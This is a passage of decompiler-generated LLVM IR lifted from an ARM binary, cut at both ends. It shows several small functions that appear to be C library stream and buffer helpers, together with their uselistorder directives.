dec_label_pc_e708:                                ; preds = %dec_label_pc_e2c4, %dec_label_pc_e3d0, %dec_label_pc_e480, %dec_label_pc_e454, %dec_label_pc_e460, %dec_label_pc_e3a0, %dec_label_pc_e640, %dec_label_pc_e5ec, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %bb147, %bb146, %dec_label_pc_e708
  %v2_e710 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_e710, i32* @r4, align 4
  store i32 %v6_e274, i32* @r5, align 4
  %v26_e710 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_e710

; uselistorder directives
  uselistorder i32 %v3_e6e8, { 1, 0 }
  uselistorder i32 %v1_e6a8, { 1, 2, 0 }
  uselistorder i32 %v0_e65c, { 1, 2, 0 }
  uselistorder i32 %v2_e638, { 1, 0 }
  uselistorder i32 %v1_e638, { 1, 0, 2 }
  uselistorder i32 %v0_e658, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_e59c, { 1, 2, 0 }
  uselistorder i32 %v3_e584, { 1, 0 }
  uselistorder i32 %v3_e57c, { 1, 0 }
  uselistorder i32 %v2_e55c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e544, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e528, { 1, 0, 2 }
  uselistorder i32 %v3_e508, { 2, 1, 0 }
  uselistorder i32 %v1_e4cc, { 0, 2, 3, 1 }
  uselistorder i32 %v2_e4a0, { 1, 0 }
  uselistorder i32 %v5_e400, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e400, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_e3ac, { 1, 0 }
  uselistorder i32 %v0_e3c8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_e390, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_e378, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_e364, { 1, 2, 0 }
  uselistorder i32 %v0_e3dc, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_e318, { 1, 0 }
  uselistorder i32 %v1_e2e8, { 0, 2, 1 }
  uselistorder i32 %v25_e274, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 3, 2, 17, 4, 8, 5, 1, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18 }
  uselistorder i32* %r6.global-to-local, { 10, 14, 11, 13, 0, 2, 12, 3, 4, 5, 7, 8, 15, 6, 1, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32 ()* @function_e228, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16284.375 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16294.373 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_162b0.367 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_16270.365 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_e70c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e708, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_e6d4, { 1, 0 }
  uselistorder label %dec_label_pc_e6a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e690, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e64c, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_e604, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e4b8, { 1, 0 }
  uselistorder label %dec_label_pc_e490, { 1, 0 }
  uselistorder label %dec_label_pc_e440, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e3c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e3bc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e31c, { 1, 0 }
  uselistorder label %dec_label_pc_e30c, { 1, 0 }
}

define i32 @function_e738(i8* %arg1) local_unnamed_addr {
dec_label_pc_e738:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e738 = load i32, i32* @r4, align 4
  store i32 %v3_e738, i32* %stack_var_-16, align 4
  %v2_e73c = add i32 %tmp, 52
  %v3_e73c = inttoptr i32 %v2_e73c to i32*
  %v4_e73c = load i32, i32* %v3_e73c, align 4
  store i32 %v4_e73c, i32* %r6.global-to-local, align 4
  %v2_e744 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e748 = icmp eq i32 %v4_e73c, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_e744, i32* @r0, align 4
  br i1 %v2_e748, label %dec_label_pc_e760, label %dec_label_pc_e77c

dec_label_pc_e760:                                ; preds = %dec_label_pc_e738
  %v1_e768 = call i32 @function_10d54()
  %v1_e778 = call i32 @function_10d4c()
  %v0_e77c.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_e784.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e77c

dec_label_pc_e77c:                                ; preds = %dec_label_pc_e738, %dec_label_pc_e760
  %v0_e784 = phi i32 [ %v4_e73c, %dec_label_pc_e738 ], [ %v0_e784.pre, %dec_label_pc_e760 ]
  %v0_e77c = phi i32 [ %tmp, %dec_label_pc_e738 ], [ %v0_e77c.pre, %dec_label_pc_e760 ]
  %v1_e77c = add i32 %v0_e77c, 1
  %v2_e77c = inttoptr i32 %v1_e77c to i8*
  %v3_e77c = load i8, i8* %v2_e77c, align 1
  %v4_e77c = zext i8 %v3_e77c to i32
  %v1_e780 = inttoptr i32 %v0_e77c to i8*
  %v2_e780 = load i8, i8* %v1_e780, align 1
  %v3_e780 = zext i8 %v2_e780 to i32
  %v2_e784 = icmp eq i32 %v0_e784, 0
  %v4_e790 = mul nuw nsw i32 %v4_e77c, 256
  %v5_e790 = or i32 %v3_e780, %v4_e790
  store i32 %v5_e790, i32* %r4.global-to-local, align 4
  br i1 %v2_e784, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e77c
  call void @__pseudo_branch(i32 68948)
  %v0_e7a0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e77c, %bb
  %v0_e7a0 = phi i32 [ %v5_e790, %dec_label_pc_e77c ], [ %v0_e7a0.pre, %bb ]
  %v1_e7a0 = and i32 %v0_e7a0, 4
  %v2_e7a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e7a8, i32* @r4, align 4
  ret i32 %v1_e7a0

; uselistorder directives
  uselistorder i32 %v0_e77c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e77c, { 1, 0 }
}

define i32 @function_e7bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e7bc:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e7bc = load i32, i32* @r4, align 4
  store i32 %v3_e7bc, i32* %stack_var_-24, align 4
  %v6_e7bc = load i32, i32* @r5, align 4
  %v9_e7bc = load i32, i32* @r6, align 4
  %v12_e7bc = load i32, i32* @r7, align 4
  %v1_e7c0 = add i32 %arg3, 52
  %v2_e7c0 = inttoptr i32 %v1_e7c0 to i32*
  %v3_e7c0 = load i32, i32* %v2_e7c0, align 4
  store i32 %v3_e7c0, i32* %r8.global-to-local, align 4
  %v2_e7c4 = ptrtoint i32* %stack_var_-40 to i32
  %v1_e7c8 = add i32 %arg3, 56
  store i32 %v1_e7c8, i32* @r5, align 4
  %v2_e7cc = icmp eq i32 %v3_e7c0, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_e7c4, i32* @r0, align 4
  br i1 %v2_e7cc, label %dec_label_pc_e7ec, label %dec_label_pc_e808

dec_label_pc_e7ec:                                ; preds = %dec_label_pc_e7bc
  %v1_e7f4 = call i32 @function_10d54()
  store i32 59400, i32* @lr, align 4
  %v1_e804 = call i32 @function_10d4c()
  %v0_e808.pre = load i32, i32* @r6, align 4
  %v0_e80c.pre = load i32, i32* @r4, align 4
  %v0_e810.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e808

dec_label_pc_e808:                                ; preds = %dec_label_pc_e7bc, %dec_label_pc_e7ec
  %v0_e810 = phi i32 [ %arg1, %dec_label_pc_e7bc ], [ %v0_e810.pre, %dec_label_pc_e7ec ]
  %v0_e80c = phi i32 [ %arg3, %dec_label_pc_e7bc ], [ %v0_e80c.pre, %dec_label_pc_e7ec ]
  %v0_e808 = phi i32 [ %arg2, %dec_label_pc_e7bc ], [ %v0_e808.pre, %dec_label_pc_e7ec ]
  %v3_e814 = inttoptr i32 %v0_e810 to i8*
  %v4_e814 = call i32 @function_eccc(i8* %v3_e814, i32 %v0_e808, i32 %v0_e80c)
  %v0_e818 = load i32, i32* %r8.global-to-local, align 4
  %v2_e818 = icmp eq i32 %v0_e818, 0
  store i32 %v4_e814, i32* %r4.global-to-local, align 4
  br i1 %v2_e818, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e808
  store i32 59444, i32* @lr, align 4
  call void @__pseudo_branch(i32 68948)
  %v0_e834.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e808, %bb
  %v0_e834 = phi i32 [ %v4_e814, %dec_label_pc_e808 ], [ %v0_e834.pre, %bb ]
  %v2_e83c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e83c, i32* @r4, align 4
  store i32 %v6_e7bc, i32* @r5, align 4
  store i32 %v9_e7bc, i32* @r6, align 4
  store i32 %v12_e7bc, i32* @r7, align 4
  ret i32 %v0_e834

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e808, { 1, 0 }
}

define i32 @function_e850(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e850:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e850 = load i32, i32* @r4, align 4
  store i32 %v3_e850, i32* %stack_var_-16, align 4
  %v6_e850 = load i32, i32* @r5, align 4
  %v9_e850 = load i32, i32* @r6, align 4
  %v1_e854 = add i32 %arg2, 52
  %v2_e854 = inttoptr i32 %v1_e854 to i32*
  %v3_e854 = load i32, i32* %v2_e854, align 4
  %v1_e858 = add i32 %arg2, 56
  store i32 %v1_e858, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e85c = icmp eq i32 %v3_e854, 0
  %v2_e860 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 %v1_e858, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v2_e85c, label %dec_label_pc_e89c, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %dec_label_pc_e850
  %v1_e874 = add i32 %arg2, 16
  %v2_e874 = inttoptr i32 %v1_e874 to i32*
  %v3_e874 = load i32, i32* %v2_e874, align 4
  store i32 %v3_e874, i32* %r2.global-to-local, align 4
  %v1_e878 = add i32 %arg2, 28
  %v2_e878 = inttoptr i32 %v1_e878 to i32*
  %v3_e878 = load i32, i32* %v2_e878, align 4
  %v3_e87c = icmp uge i32 %v3_e874, %v3_e878
  store i1 %v3_e87c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_e87c, label %dec_label_pc_e890, label %bb

bb:                                               ; preds = %dec_label_pc_e874
  %v5_e880 = inttoptr i32 %v3_e874 to i8*
  store i8 %arg1, i8* %v5_e880, align 1
  %v0_e884.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  %v3_e890.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e884.pr, label %dec_label_pc_e890, label %.thread1

.thread1:                                         ; preds = %bb
  %v2_e884 = inttoptr i32 %v3_e890.pre to i8*
  %v3_e884 = load i8, i8* %v2_e884, align 1
  %v4_e884 = zext i8 %v3_e884 to i32
  store i32 %v4_e884, i32* %r5.global-to-local, align 4
  %v6_e884 = add i32 %v3_e890.pre, 1
  store i32 %v6_e884, i32* %r2.global-to-local, align 4
  store i32 %v6_e884, i32* %v2_e874, align 4
  br label %dec_label_pc_e900

dec_label_pc_e890:                                ; preds = %bb, %dec_label_pc_e874
  %v3_e890 = phi i32 [ %v3_e874, %dec_label_pc_e874 ], [ %v3_e890.pre, %bb ]
  %v5_e890 = call i32 @function_ed64(i8 %arg1, i32 %arg2, i32 %v3_e890)
  store i32 %v5_e890, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e900

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e850
  store i32 %v2_e860, i32* @r0, align 4
  %v1_e8ac = call i32 @function_10d54()
  store i32 59584, i32* @lr, align 4
  %v1_e8bc = call i32 @function_10d4c()
  %v0_e8c0 = load i32, i32* @r4, align 4
  %v1_e8c0 = add i32 %v0_e8c0, 16
  %v2_e8c0 = inttoptr i32 %v1_e8c0 to i32*
  %v3_e8c0 = load i32, i32* %v2_e8c0, align 4
  store i32 %v3_e8c0, i32* %r2.global-to-local, align 4
  %v1_e8c4 = add i32 %v0_e8c0, 28
  %v2_e8c4 = inttoptr i32 %v1_e8c4 to i32*
  %v3_e8c4 = load i32, i32* %v2_e8c4, align 4
  %v3_e8c8 = icmp uge i32 %v3_e8c0, %v3_e8c4
  store i1 %v3_e8c8, i1* %cpsr_c.global-to-local, align 1
  %v0_e8d0 = load i32, i32* @r5, align 4
  %v1_e8d0 = trunc i32 %v0_e8d0 to i8
  br i1 %v3_e8c8, label %dec_label_pc_e8e4, label %bb12

bb12:                                             ; preds = %dec_label_pc_e89c
  %v4_e8d4 = inttoptr i32 %v3_e8c0 to i8*
  store i8 %v1_e8d0, i8* %v4_e8d4, align 1
  %v0_e8d8.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  %v3_e8e4.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e8d8.pr, label %dec_label_pc_e8e4, label %.thread4

.thread4:                                         ; preds = %bb12
  %v2_e8d8 = inttoptr i32 %v3_e8e4.pre to i8*
  %v3_e8d8 = load i8, i8* %v2_e8d8, align 1
  %v4_e8d8 = zext i8 %v3_e8d8 to i32
  store i32 %v4_e8d8, i32* %r5.global-to-local, align 4
  %v6_e8d8 = add i32 %v3_e8e4.pre, 1
  store i32 %v6_e8d8, i32* %r2.global-to-local, align 4
  %v2_e8dc = load i32, i32* @r4, align 4
  %v3_e8dc = add i32 %v2_e8dc, 16
  %v4_e8dc = inttoptr i32 %v3_e8dc to i32*
  store i32 %v6_e8d8, i32* %v4_e8dc, align 4
  br label %dec_label_pc_e8ec

dec_label_pc_e8e4:                                ; preds = %bb12, %dec_label_pc_e89c
  %v3_e8e4 = phi i32 [ %v3_e8c0, %dec_label_pc_e89c ], [ %v3_e8e4.pre, %bb12 ]
  %v5_e8e4 = call i32 @function_ed64(i8 %v1_e8d0, i32 %v0_e8c0, i32 %v3_e8e4)
  store i32 %v5_e8e4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %.thread4, %dec_label_pc_e8e4
  store i32 %v2_e860, i32* @r0, align 4
  store i32 59648, i32* @lr, align 4
  %v1_e8fc = call i32 @function_10d54()
  br label %dec_label_pc_e900

dec_label_pc_e900:                                ; preds = %.thread1, %dec_label_pc_e890, %dec_label_pc_e8ec
  %v0_e900 = load i32, i32* %r5.global-to-local, align 4
  %v2_e908 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e908, i32* @r4, align 4
  store i32 %v6_e850, i32* @r5, align 4
  store i32 %v9_e850, i32* @r6, align 4
  %sext = mul i32 %v0_e900, 16777216
  %v15_e908 = sdiv i32 %sext, 16777216
  ret i32 %v15_e908

; uselistorder directives
  uselistorder i32 %v3_e8e4.pre, { 0, 2, 1 }
  uselistorder i8 %v1_e8d0, { 1, 0 }
  uselistorder i32 %v3_e890.pre, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 0, 2, 1, 5, 4, 3 }
  uselistorder label %dec_label_pc_e900, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e8ec, { 1, 0 }
}

define i32 @function_e91c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e91c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_e91c = load i32, i32* @r4, align 4
  store i32 %v3_e91c, i32* %stack_var_-20, align 4
  %v6_e91c = load i32, i32* @r5, align 4
  %v9_e91c = load i32, i32* @r6, align 4
  %v12_e91c = load i32, i32* @r7, align 4
  %v1_e920 = add i32 %arg2, 52
  %v2_e920 = inttoptr i32 %v1_e920 to i32*
  %v3_e920 = load i32, i32* %v2_e920, align 4
  store i32 %v3_e920, i32* @r7, align 4
  %v1_e924 = add i32 %arg2, 56
  store i32 %v1_e924, i32* @r5, align 4
  %v2_e928 = ptrtoint i32* %stack_var_-36 to i32
  %v2_e92c = icmp eq i32 %v3_e920, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_e928, i32* @r0, align 4
  br i1 %v2_e92c, label %dec_label_pc_e948, label %dec_label_pc_e964

dec_label_pc_e948:                                ; preds = %dec_label_pc_e91c
  %v1_e950 = call i32 @function_10d54()
  store i32 59748, i32* @lr, align 4
  %v1_e960 = call i32 @function_10d4c()
  %v0_e964.pre = load i32, i32* @r4, align 4
  %v0_e968.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e964

dec_label_pc_e964:                                ; preds = %dec_label_pc_e91c, %dec_label_pc_e948
  %v0_e968 = phi i32 [ %arg1, %dec_label_pc_e91c ], [ %v0_e968.pre, %dec_label_pc_e948 ]
  %v0_e964 = phi i32 [ %arg2, %dec_label_pc_e91c ], [ %v0_e964.pre, %dec_label_pc_e948 ]
  %v2_e96c = call i32 @function_ee68(i32 %v0_e968, i32 %v0_e964)
  %v0_e970 = load i32, i32* @r7, align 4
  %v2_e970 = icmp eq i32 %v0_e970, 0
  store i32 %v2_e96c, i32* %r4.global-to-local, align 4
  br i1 %v2_e970, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e964
  call void @__pseudo_branch(i32 68948)
  %v0_e98c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e964, %bb
  %v0_e98c = phi i32 [ %v2_e96c, %dec_label_pc_e964 ], [ %v0_e98c.pre, %bb ]
  %v2_e994 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e994, i32* @r4, align 4
  store i32 %v6_e91c, i32* @r5, align 4
  store i32 %v9_e91c, i32* @r6, align 4
  store i32 %v12_e91c, i32* @r7, align 4
  ret i32 %v0_e98c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_ee68, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e964, { 1, 0 }
}

define i32 @function_e9a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_e9a8:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_e9ac = ptrtoint i32* %stack_var_-48 to i32
  %v2_e9b0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_e9b0, i32* @r0, align 4
  store i32 68948, i32* %r4.global-to-local, align 4
  %v1_e9c4 = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r5.global-to-local, align 4
  %v1_e9d4 = call i32 @function_10d4c()
  %v2_e9dc = load i32, i32* @global_var_188a4.289, align 4
  %v7_e9e0 = icmp eq i32 %v2_e9dc, 1
  br i1 %v7_e9e0, label %dec_label_pc_e9e8, label %dec_label_pc_ea94

dec_label_pc_e9e8:                                ; preds = %dec_label_pc_e9a8
  %v2_e9ec = load i32, i32* @global_var_188a8.294, align 4
  %tmp19 = icmp slt i32 %v2_e9ec, 1
  br i1 %tmp19, label %dec_label_pc_ea94, label %dec_label_pc_e9f8

dec_label_pc_e9f8:                                ; preds = %dec_label_pc_e9e8
  store i32 %v2_e9ac, i32* @r0, align 4
  %v1_ea08 = call i32 @function_10d54()
  %v1_ea14 = call i32 @function_10d4c()
  %v2_ea1c = load i32, i32* bitcast (i32** @global_var_1810c.329 to i32*), align 4
  store i32 %v2_ea1c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_ea6c3 = icmp eq i32 %v2_ea1c, 0
  br i1 %v2_ea6c3, label %dec_label_pc_ea78, label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_e9f8, %dec_label_pc_ea68
  %v1_ea40 = phi i32 [ %v0_ea68, %dec_label_pc_ea68 ], [ %v2_ea1c, %dec_label_pc_e9f8 ]
  %v1_ea28 = inttoptr i32 %v1_ea40 to i8*
  %v2_ea28 = load i8, i8* %v1_ea28, align 1
  %v3_ea28 = zext i8 %v2_ea28 to i32
  %v1_ea2c = add i32 %v1_ea40, 1
  %v2_ea2c = inttoptr i32 %v1_ea2c to i8*
  %v3_ea2c = load i8, i8* %v2_ea2c, align 1
  %v4_ea2c = zext i8 %v3_ea2c to i32
  %v4_ea30 = mul nuw nsw i32 %v4_ea2c, 256
  %v5_ea30 = or i32 %v4_ea30, %v3_ea28
  %v2_ea34 = and i32 %v5_ea30, 32816
  %v7_ea38 = icmp eq i32 %v2_ea34, 48
  %v1_ea3c = add i32 %v1_ea40, 32
  %v2_ea3c = inttoptr i32 %v1_ea3c to i32*
  %v3_ea3c = load i32, i32* %v2_ea3c, align 4
  store i32 %v3_ea3c, i32* %r5.global-to-local, align 4
  br i1 %v7_ea38, label %dec_label_pc_ea48, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_ea28
  store i32 %v1_ea40, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ea68

dec_label_pc_ea48:                                ; preds = %dec_label_pc_ea28
  %v0_ea48 = load i32, i32* %r6.global-to-local, align 4
  %v2_ea48 = icmp eq i32 %v0_ea48, 0
  br i1 %v2_ea48, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_ea48
  %v3_ea50 = add i32 %v0_ea48, 32
  %v4_ea50 = inttoptr i32 %v3_ea50 to i32*
  store i32 %v3_ea3c, i32* %v4_ea50, align 4
  %v0_ea58.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_ea48
  store i32 %v3_ea3c, i32* bitcast (i32** @global_var_1810c.329 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_ea58 = phi i32 [ %v0_ea58.pre, %.thread ], [ %v1_ea40, %.thread1 ]
  %v1_ea58 = add i32 %v0_ea58, 1
  %v2_ea58 = inttoptr i32 %v1_ea58 to i8*
  %v3_ea58 = load i8, i8* %v2_ea58, align 1
  %v1_ea5c = and i8 %v3_ea58, 32
  %v1_ea64 = icmp ne i8 %v1_ea5c, 0
  call void @__pseudo_cond_branch(i1 %v1_ea64, i32 ptrtoint (i32* @global_var_fdcc.291 to i32))
  %v0_ea68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %.thread12, %bb
  %v0_ea68 = phi i32 [ %v0_ea68.pre, %bb ], [ %v3_ea3c, %.thread12 ]
  store i32 %v0_ea68, i32* %r4.global-to-local, align 4
  %v2_ea6c = icmp eq i32 %v0_ea68, 0
  br i1 %v2_ea6c, label %dec_label_pc_ea78, label %dec_label_pc_ea28

dec_label_pc_ea78:                                ; preds = %dec_label_pc_ea68, %dec_label_pc_e9f8
  store i32 %v2_e9ac, i32* @r0, align 4
  %v1_ea88 = call i32 @function_10d54()
  %v0_ea90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ea90, i32* @global_var_188a8.294, align 4
  %v2_ea98.pre = load i32, i32* @global_var_188a4.289, align 4
  br label %dec_label_pc_ea94

dec_label_pc_ea94:                                ; preds = %dec_label_pc_e9a8, %dec_label_pc_e9e8, %dec_label_pc_ea78
  %v2_ea98 = phi i32 [ %v2_e9dc, %dec_label_pc_e9a8 ], [ 1, %dec_label_pc_e9e8 ], [ %v2_ea98.pre, %dec_label_pc_ea78 ]
  %v1_ea9c = add i32 %v2_ea98, -1
  store i32 %v1_ea9c, i32* @global_var_188a4.289, align 4
  store i32 %v2_e9b0, i32* @r0, align 4
  store i32 60088, i32* @lr, align 4
  %v1_eab4 = call i32 @function_10d54()
  ret i32 %v1_eab4

; uselistorder directives
  uselistorder i32 %v0_ea68, { 2, 1, 0 }
  uselistorder i32 %v3_ea3c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ea40, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_188a8.294, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ea94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ea68, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_ea28, { 1, 0 }
}

define i32 @function_eae8(i8* %arg1) local_unnamed_addr {
dec_label_pc_eae8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_eae8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_1810c.329 to i32), i32* %r3.global-to-local, align 4
  %v10_eaf0 = icmp eq i8* %arg1, bitcast (i32** @global_var_1810c.329 to i8*)
  store i1 %v10_eaf0, i1* %cpsr_z.global-to-local, align 1
  %.v1_eaf4 = select i1 %v10_eaf0, i32 0, i32 %tmp
  store i32 %.v1_eaf4, i32* %r8.global-to-local, align 4
  %v2_eafc = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_eaf0, label %bb, label %dec_label_pc_eb08

bb:                                               ; preds = %dec_label_pc_eae8
  store i32 %.v1_eaf4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_eb14

dec_label_pc_eb08:                                ; preds = %dec_label_pc_eae8
  %v2_eb08 = icmp eq i32 %.v1_eaf4, 0
  store i1 %v2_eb08, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_eb08, label %dec_label_pc_eb14, label %dec_label_pc_ec60

dec_label_pc_eb14:                                ; preds = %bb, %dec_label_pc_eb08
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
